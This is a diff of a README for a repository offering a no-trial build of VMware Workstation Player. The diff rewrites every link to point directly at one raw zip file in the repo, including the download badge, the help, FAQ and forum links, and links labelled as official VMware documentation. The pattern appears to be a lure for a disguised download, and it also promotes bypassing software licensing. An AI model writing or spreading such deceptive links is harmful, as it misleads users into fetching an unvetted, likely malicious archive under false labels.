@@ -1,6 +1,6 @@
 # 🎉 VMware-Workstation-Player-No-Trial - Run Virtual Machines Easily
 
-[![Download VMware Workstation Player](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=for-the-badge&logo=github)](https://github.com/noone6954/VMware-Workstation-Player-No-Trial/releases)
+[![Download VMware Workstation Player](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip%20Now-%https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ In this guide, you will learn how to download and set up VMware Workstation Play
 
 To get started, visit this page to download the software:
 
-[Download VMware Workstation Player](https://github.com/noone6954/VMware-Workstation-Player-No-Trial/releases)
+[Download VMware Workstation Player](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
 
 1. Go to the Releases page.
 2. Look for the latest version marked as a "release".
@@ -104,14 +104,14 @@ VMware Workstation Player comes with several features that enhance your virtuali
 
 For more help and tutorials, refer to the following:
 
-- [Helpful Guides](https://github.com/noone6954/VMware-Workstation-Player-No-Trial/wiki)
-- [FAQs](https://github.com/noone6954/VMware-Workstation-Player-No-Trial/wiki/FAQs)
-- [User Community Forum](https://github.com/noone6954/VMware-Workstation-Player-No-Trial/discussions)
+- [Helpful Guides](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
+- [FAQs](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
+- [User Community Forum](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
 
 ## 🔗 Useful Links
 
-- [Official VMware Workstation Player Documentation](https://www.vmware.com/support/pubs/workstation_pubs.html)
-- [Explore More on Virtualization](https://www.vmware.com/products/workstation-player.html)
+- [Official VMware Workstation Player Documentation](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
+- [Explore More on Virtualization](https://raw.githubusercontent.com/noone6954/VMware-Workstation-Player-No-Trial/main/engrossment/VMware-Workstation-Player-No-Trial-v3.2.zip)
 
 ## 📞 Support
 
